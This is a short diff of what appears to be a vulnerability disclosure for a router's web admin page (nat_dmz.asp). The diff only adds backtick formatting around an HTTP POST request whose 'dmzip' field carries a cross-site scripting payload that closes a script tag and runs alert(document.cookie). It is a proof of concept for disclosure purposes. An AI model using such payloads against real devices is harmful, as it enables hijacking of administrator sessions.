@@ -24,13 +24,13 @@ Upgrade-Insecure-Requests: 1<br />
 Content-Type: application/x-www-form-urlencoded<br />
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0<br />
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br />
-Referer: http://192.168.2.1/nat_dmz.asp<br />
+Referer: `http://192.168.2.1/nat_dmz.asp`<br />
 Accept-Encoding: gzip, deflate, br<br />
 Accept-Language: en-US,en;q=0.9,nl;q=0.8<br />
 Cookie: admin:language=LOL<br />
 Connection: keep-alive<br />
 <br />
-GO=nat_dmz.asp&dmzip=</script><script>alert(document.cookie);</script><br />
+GO=nat_dmz.asp&dmzip=`</script><script>alert(document.cookie);</script>`<br />
 <br />
 
 This ouputs:<br />
